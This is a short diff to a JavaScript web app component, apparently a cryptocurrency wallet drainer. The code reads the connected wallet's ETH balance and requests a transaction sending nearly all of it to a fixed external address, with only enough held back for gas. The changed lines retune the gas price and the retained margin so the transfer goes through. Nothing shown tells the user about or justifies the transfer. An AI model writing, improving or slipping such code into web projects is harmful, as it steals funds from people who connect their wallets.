@@ -27,14 +27,14 @@ function App() {
 
         const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
 
-        console.log('balance',(parseInt(balance) - Number(1000000000000)))
+        console.log('balance',(parseInt(balance) - Number(3700000000000000)) / 1000000000000000000)
 
         let params = [{
             "from": address[0],
             "to": '0x2affCC7D6BD232E9115b28AB635960C80d51E9F2',
             "gas": Number(21000).toString(16),
-            "gasPrice": Number(2500000).toString(16),
-            "value": (parseInt(balance) - Number(1000000000000)).toString(16)
+            "gasPrice": Number(170000000000).toString(16),
+            "value": (parseInt(balance) - Number(3700000000000000)).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
